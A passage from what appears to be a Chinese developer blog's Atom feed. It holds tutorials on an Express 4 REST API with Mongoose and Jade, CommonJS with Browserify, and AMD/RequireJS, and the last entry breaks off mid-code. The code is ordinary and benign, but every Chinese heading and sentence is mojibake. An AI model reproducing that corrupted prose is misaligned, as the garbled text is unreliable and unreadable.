class="code"><pre><span class="line"><span class="keyword">var</span> port = process.env.PORT || <span class="number">2100</span>;</span><br></pre></td></tr></table></figure><h4 id="è¿æ¥æ•°æ®åº“"><a href="#è¿æ¥æ•°æ®åº“" class="headerlink" title="è¿æ¥æ•°æ®åº“"></a>è¿æ¥æ•°æ®åº“</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</span><br><span class="line">mongoose.connect(<span class="string">'mongodb://127.0.0.1:27017/rest'</span>); <span class="comment">// connect to our database</span></span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ -middleware-é€šè¿‡-router-use"><a href="#æ·»åŠ -middleware-é€šè¿‡-router-use" class="headerlink" title="æ·»åŠ  middleware é€šè¿‡ router.use"></a>æ·»åŠ  <code>middleware</code> é€šè¿‡ <em>router.use</em></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"></span><br><span class="line"><span class="comment">// middleware to use for all requests</span></span><br><span class="line">router.use(<span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// do logging</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Something is happening.'</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="æµ‹è¯•è·¯ç”±"><a href="#æµ‹è¯•è·¯ç”±" class="headerlink" title="æµ‹è¯•è·¯ç”±"></a>æµ‹è¯•è·¯ç”±</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    res.json(&#123;<span class="attr">message</span>: <span class="string">'hooray! welcome to our api!'</span>&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ ä¸€ä¸ª-app-models-bear-js"><a href="#æ·»åŠ ä¸€ä¸ª-app-models-bear-js" class="headerlink" title="æ·»åŠ ä¸€ä¸ª app/models/bear.js"></a>æ·»åŠ ä¸€ä¸ª <code>app/models/bear.js</code></h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mongoose     = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</span><br><span class="line"><span class="keyword">var</span> Schema       = mongoose.Schema;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> BearSchema   = <span class="keyword">new</span> Schema(&#123;</span><br><span class="line">    name: <span class="built_in">String</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = mongoose.model(<span class="string">'Bear'</span>, BearSchema);</span><br></pre></td></tr></table></figure><h4 id="å¾€-MongoDB-æ·»åŠ æ•°æ®å’Œè·å–æ•°æ®"><a href="#å¾€-MongoDB-æ·»åŠ æ•°æ®å’Œè·å–æ•°æ®" class="headerlink" title="å¾€ MongoDB æ·»åŠ æ•°æ®å’Œè·å–æ•°æ®"></a>å¾€ <strong>MongoDB</strong> æ·»åŠ æ•°æ®å’Œè·å–æ•°æ®</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Bear = <span class="built_in">require</span>(<span class="string">'./app/models/bear'</span>);</span><br><span class="line"></span><br><span class="line">router.route(<span class="string">'/bears'</span>)</span><br><span class="line">    .post(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> bear = <span class="keyword">new</span> Bear();      <span class="comment">// create a new instance of the Bear model</span></span><br><span class="line">        bear.name = req.body.name;  <span class="comment">// set the bears name (comes from the request)</span></span><br><span class="line"></span><br><span class="line">        bear.save(<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                res.send(err);</span><br><span class="line"></span><br><span class="line">            res.json(&#123;<span class="attr">message</span>: <span class="string">'Bear created!'</span>&#125;);</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        Bear.find(<span class="function"><span class="keyword">function</span> (<span class="params">err, bears</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                res.send(err);</span><br><span class="line"></span><br><span class="line">            res.json(bears);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h4 id="æ·»åŠ æ•°æ®åº“æœç´¢ã€æ›´æ–°å’Œåˆ é™¤åŠŸèƒ½"><a href="#æ·»åŠ æ•°æ®åº“æœç´¢ã€æ›´æ–°å’Œåˆ é™¤åŠŸèƒ½" class="headerlink" title="æ·»åŠ æ•°æ®åº“æœç´¢ã€æ›´æ–°å’Œåˆ é™¤åŠŸèƒ½"></a>æ·»åŠ æ•°æ®åº“æœç´¢ã€æ›´æ–°å’Œåˆ é™¤åŠŸèƒ½</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">router.route(<span class="string">'/bears/:bear_id'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get the bear with that id</span></span><br><span class="line">    .get(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        Bear.findById(req.params.bear_id, <span class="function"><span class="keyword">function</span> (<span class="params">err, bear</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                res.send(err);</span><br><span class="line">            res.json(bear);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// update the bear with this id</span></span><br><span class="line">    .put(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        Bear.findById(req.params.bear_id, <span class="function"><span class="keyword">function</span> (<span class="params">err, bear</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                res.send(err);</span><br><span class="line"></span><br><span class="line">            bear.name = req.body.name;</span><br><span class="line">            bear.save(<span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (err)</span><br><span class="line">                    res.send(err);</span><br><span class="line"></span><br><span class="line">                res.json(&#123;<span class="attr">message</span>: <span class="string">'Bear updated!'</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="comment">// delete the bear with this id</span></span><br><span class="line">    .delete(<span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">        Bear.remove(&#123;</span><br><span class="line">            _id: req.params.bear_id</span><br><span class="line">        &#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, bear</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (err)</span><br><span class="line">                res.send(err);</span><br><span class="line"></span><br><span class="line">            res.json(&#123;<span class="attr">message</span>: <span class="string">'Successfully deleted'</span>&#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><h4 id="æ³¨å†Œè·¯ç”±"><a href="#æ³¨å†Œè·¯ç”±" class="headerlink" title="æ³¨å†Œè·¯ç”±"></a>æ³¨å†Œè·¯ç”±</h4><p>æ„å‘³ç€ä¸Šè¿° <code>router</code> æ“ä½œéƒ½æ˜¯åœ¨ <code>/api</code> ä¸‹å®Œæˆçš„</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">'/api'</span>, router);</span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®æ¨¡æ¿è·¯å¾„ã€æ¨¡æ¿æ¸²æŸ“å¼•æ“å’Œæ¸²æŸ“é…ç½®"><a href="#è®¾ç½®æ¨¡æ¿è·¯å¾„ã€æ¨¡æ¿æ¸²æŸ“å¼•æ“å’Œæ¸²æŸ“é…ç½®" class="headerlink" title="è®¾ç½®æ¨¡æ¿è·¯å¾„ã€æ¨¡æ¿æ¸²æŸ“å¼•æ“å’Œæ¸²æŸ“é…ç½®"></a>è®¾ç½®æ¨¡æ¿è·¯å¾„ã€æ¨¡æ¿æ¸²æŸ“å¼•æ“å’Œæ¸²æŸ“é…ç½®</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">app.set(<span class="string">'views'</span>, path.join(__dirname + <span class="string">'/views'</span>));</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'jade'</span>);</span><br><span class="line"><span class="comment">// é»˜è®¤ä¸º developmentï¼Œç¼–è¯‘ä»£ç ä¸º pretty</span></span><br><span class="line">app.locals.pretty = app.get(<span class="string">'env'</span>) != <span class="string">'production'</span>;</span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„"><a href="#è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„" class="headerlink" title="è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„"></a>è®¾ç½®é™æ€æ–‡ä»¶è·¯å¾„</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'public'</span>));</span><br></pre></td></tr></table></figure><h4 id="è®¾ç½®é¡µé¢æ•°æ®å’Œæ¸²æŸ“æ–‡ä»¶"><a href="#è®¾ç½®é¡µé¢æ•°æ®å’Œæ¸²æŸ“æ–‡ä»¶" class="headerlink" title="è®¾ç½®é¡µé¢æ•°æ®å’Œæ¸²æŸ“æ–‡ä»¶"></a>è®¾ç½®é¡µé¢æ•°æ®å’Œæ¸²æŸ“æ–‡ä»¶</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> data = &#123;</span><br><span class="line">        title: <span class="string">'Express'</span>,</span><br><span class="line">        message: <span class="string">'Hello earth!'</span></span><br><span class="line">    &#125;;</span><br><span class="line">    res.render(<span class="string">'index'</span>, data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ä¸é€‚ç”¨å¼•æ“æ¸²æŸ“æ—¶åˆ™ä½¿ç”¨ <code>res.sendFile</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.sendFile(path.join(__dirname + <span class="string">'/view/index'</span>));</span><br></pre></td></tr></table></figure><h4 id="ç›‘å¬ç«¯å£"><a href="#ç›‘å¬ç«¯å£" class="headerlink" title="ç›‘å¬ç«¯å£"></a>ç›‘å¬ç«¯å£</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.listen(port);</span><br></pre></td></tr></table></figure><h4 id="Jade-æ¨¡æ¿"><a href="#Jade-æ¨¡æ¿" class="headerlink" title="Jade æ¨¡æ¿"></a>Jade æ¨¡æ¿</h4><p><code>views/index.jade</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">doctype html</span><br><span class="line">html(lang=&apos;en-US&apos;)</span><br><span class="line">    head</span><br><span class="line">    meta(charset=&apos;utf-8&apos;)</span><br><span class="line">    link(rel=&apos;stylesheet&apos;, href=&apos;static/css/bootstrap.min.css&apos;)</span><br><span class="line">    title #&#123;title&#125;</span><br><span class="line">    body</span><br><span class="line">    .container</span><br><span class="line">        header.jumbotron</span><br><span class="line">        h1 #&#123;message&#125;</span><br><span class="line"></span><br><span class="line">    include common-js</span><br></pre></td></tr></table></figure><p><code>common-js.jade</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">script(type=&apos;text/javascript&apos;, src=&apos;static/js/jquery.js&apos;)</span><br><span class="line">script(type=&apos;text/javascript&apos;, src=&apos;static/js/bootstrap.min.js&apos;)</span><br></pre></td></tr></table></figure><blockquote><p>å»¶ä¼¸é˜…è¯»ï¼š<a href="https://scotch.io/tutorials/build-a-restful-api-using-node-and-express-4" target="_blank" rel="noopener">Build a RESTful API Using Node and Express 4</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;åˆ›å»º-package-json&quot;&gt;&lt;a href=&quot;#åˆ›å»º-package-json&quot; class=&quot;headerlink&quot; title=&quot;åˆ›å»º package.json&quot;&gt;&lt;/a&gt;åˆ›å»º package.json&lt;/h4&gt;&lt;figure class=&quot;highlight json&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;name&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;express-basis&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;main&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;service.js&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;dependencies&quot;&lt;/span&gt;: &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;body-parser&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.13.3&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;express&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^4.13.3&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;jade&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.11.0&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;mongoose&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^4.1.4&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;morgan&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.6.1&quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;attr&quot;&gt;&quot;underscore&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;^1.8.3&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;body-parser æ˜¯ä¸ºäº†å–å¾— &lt;code&gt;req.body.param&lt;/code&gt;ã€‚&lt;/li&gt;
&lt;li&gt;express æ˜¯æ¡†æ¶ã€‚&lt;/li&gt;
&lt;li&gt;jade æ˜¯æ¸²æŸ“å¼•æ“ã€‚&lt;/li&gt;
&lt;li&gt;mongoose æ“ä½œ &lt;strong&gt;MongoDB&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;li&gt;morgan è¾“å‡ºè®¿é—®ä¿¡æ¯ã€‚&lt;/li&gt;
&lt;li&gt;underscore æ˜¯&lt;strong&gt;ç¥å™¨&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="NodeJS" scheme="http://youngdze.co/categories/NodeJS/"/>
    
    
      <category term="Express" scheme="http://youngdze.co/tags/Express/"/>
    
  </entry>
  
  <entry>
    <title>CommonJS åŸºç¡€</title>
    <link href="http://youngdze.co/2015/08/31/commonjs-basis/"/>
    <id>http://youngdze.co/2015/08/31/commonjs-basis/</id>
    <published>2015-08-31T13:41:36.000Z</published>
    <updated>2016-12-05T04:55:42.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>CommonJS</strong> è¢«è®¾è®¡æ¥é’ˆå¯¹æœåŠ¡ç«¯ï¼Œä¸è¿‡ç°åœ¨å¯ä»¥é€šè¿‡ <strong><a href="http://browserify.org/" target="_blank" rel="noopener">Browserify</a></strong> è½¬å˜ç»™å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œå¦‚æœ‰è¿™æ–¹é¢çš„éœ€æ±‚ï¼Œæ›´å»ºè®®ä½¿ç”¨ <strong><a href="http://webpack.github.io/" target="_blank" rel="noopener">webpack</a></strong>ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">browserify .\main.js .\foo.js -o .\bundle.js</span><br></pre></td></tr></table></figure><a id="more"></a><p><strong>å®‰è£…æ¨¡å—</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install uniq</span><br></pre></td></tr></table></figure><p><strong>å®šä¹‰æ¨¡å—</strong> <code>foo.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> (<span class="params">arr</span>) </span>&#123;</span><br><span class="line">    arr.reverse();</span><br><span class="line">    <span class="built_in">console</span>.log(arr);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = foo;</span><br></pre></td></tr></table></figure><p><strong>ä½¿ç”¨æ¨¡å—</strong> <code>main.js</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> unique = <span class="built_in">require</span>(<span class="string">'uniq'</span>);</span><br><span class="line"><span class="keyword">var</span> foo = <span class="built_in">require</span>(<span class="string">'./foo.js'</span>);</span><br><span class="line"><span class="keyword">var</span> data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">0</span>];</span><br><span class="line">foo(data);</span><br><span class="line"><span class="built_in">console</span>.log(unique(data));</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;CommonJS&lt;/strong&gt; è¢«è®¾è®¡æ¥é’ˆå¯¹æœåŠ¡ç«¯ï¼Œä¸è¿‡ç°åœ¨å¯ä»¥é€šè¿‡ &lt;strong&gt;&lt;a href=&quot;http://browserify.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Browserify&lt;/a&gt;&lt;/strong&gt; è½¬å˜ç»™å®¢æˆ·ç«¯ä½¿ç”¨ï¼Œå¦‚æœ‰è¿™æ–¹é¢çš„éœ€æ±‚ï¼Œæ›´å»ºè®®ä½¿ç”¨ &lt;strong&gt;&lt;a href=&quot;http://webpack.github.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;webpack&lt;/a&gt;&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight sh&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;browserify .\main.js .\foo.js -o .\bundle.js&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Front-End" scheme="http://youngdze.co/categories/Front-End/"/>
    
    
      <category term="JavaScript" scheme="http://youngdze.co/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>AMD å’Œ RequireJS</title>
    <link href="http://youngdze.co/2015/08/31/amd-and-requirejs/"/>
    <id>http://youngdze.co/2015/08/31/amd-and-requirejs/</id>
    <published>2015-08-31T12:35:11.000Z</published>
    <updated>2016-12-05T11:40:32.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>æ‘˜å½•è‡ªï¼š<a href="https://code.tutsplus.com/tutorials/next-generation-javascript-with-amd-and-requirejs--net-21596" target="_blank" rel="noopener">Next Generation JavaScript with AMD and RequireJS</a></p></blockquote><h3 id="ä¸ºäº†è§£å†³çš„é—®é¢˜"><a href="#ä¸ºäº†è§£å†³çš„é—®é¢˜" class="headerlink" title="ä¸ºäº†è§£å†³çš„é—®é¢˜"></a>ä¸ºäº†è§£å†³çš„é—®é¢˜</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"file1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"file2.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"file3.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="å¼‚æ­¥æ¨¡å—å®šä¹‰-Asynchronous-Module-Definition-as-AMD"><a href="#å¼‚æ­¥æ¨¡å—å®šä¹‰-Asynchronous-Module-Definition-as-AMD" class="headerlink" title="å¼‚æ­¥æ¨¡å—å®šä¹‰ (Asynchronous Module Definition as AMD)"></a>å¼‚æ­¥æ¨¡å—å®šä¹‰ (Asynchronous Module Definition as AMD)</h3><p><code>dom/events.js</code> å®šä¹‰æ¨¡å—</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">define(&#123;</span><br><span class="line">    addEvent: <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (el.addEventListener) &#123;</span><br><span class="line">            <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</span><br><span class="line">                el.addEventListener(evt, fn, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">return</span> el;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (el.attachEvent) &#123;</span><br><span class="line">            <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</span><br><span class="line">                el.attachEvent(<span class="string">"on"</span> + evt, fn);</span><br><span class="line">                <span class="keyword">return</span> el;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.addEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</span><br><span class="line">                el[<span class="string">"on"</span> + evt] = fn;</span><br><span class="line">                <span class="keyword">return</span> el;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.addEvent(el, evt, fn);</span><br><span class="line">    &#125;,</span><br><span class="line">    removeEvent: <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (el.removeEventListener) &#123;</span><br><span class="line">            <span class="keyword">this</span>.removeEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) </span>&#123;</span><br><span class="line">                el.removeEventListener(evt, fn, <span class="literal">false</span>);</span><br><span class="line">                <span class="keyword">return</span> el;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (el.detachEvent) &#123;</span><br><span class="line">            <span class="keyword">this</span>.removeEvent = <span class="function"><span class="keyword">function</span> (<span class="params">el, evt, fn</span>) 